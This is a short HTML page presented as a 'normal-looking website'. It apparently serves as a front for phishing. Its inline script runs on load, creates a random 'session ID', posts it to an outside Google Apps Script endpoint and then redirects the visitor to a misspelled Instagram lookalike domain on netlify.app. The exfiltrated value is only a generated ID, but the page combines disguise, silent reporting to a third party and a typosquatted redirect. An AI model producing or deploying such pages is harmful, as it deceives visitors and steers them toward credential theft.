<!DOCTYPE html>
<html>
<head>
    <title>Normal Looking Website</title>
    <style>
        /* Add your CSS here to make the page look normal */
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 80%;
            margin: 50px auto;
            background: #fff;
            padding: 20px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }
        h1 {
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Welcome to My Website</h1>
        <p>This is a normal-looking website.</p>
    </div>

    <script>
  // Capture session ID
  function captureSessionID() {
    const sessionID = localStorage.getItem('sessionID');
    if (!sessionID) {
      const newSessionID = generateUUID();
      localStorage.setItem('sessionID', newSessionID);
      console.log('Generated Session ID:', newSessionID);
      sendSessionIDToGoogleSheets(newSessionID);
    }
  }

  // Generate a unique session ID
  function generateUUID() {
    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function(c) {
      const r = Math.random() * 16 | 0, v = c === 'x' ? r : (r & 0x3 | 0x8);
      return v.toString(16);
    });
  }

  // Send session ID to Google Sheets
  function sendSessionIDToGoogleSheets(sessionID) {
    fetch('https://script.google.com/macros/s/AKfycbxYWmsKmvTTdOvTjf5uHNWSTbHtmrCKqnqbSge4aIq2J7o4zYmm_E0hNvbti5ETovnr/exec', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `sessionID=${sessionID}`,
    })
    .then(response => response.text())
    .then(data => {
      console.log('Success:', data);
      // Redirect to another webpage
      window.location.href = 'https://www.instagaram.netlify.app';
    })
    .catch((error) => {
      console.error('Error:', error);
    });
  }

  // Call the function to capture session ID
  captureSessionID();
</script>
</body>
</html>
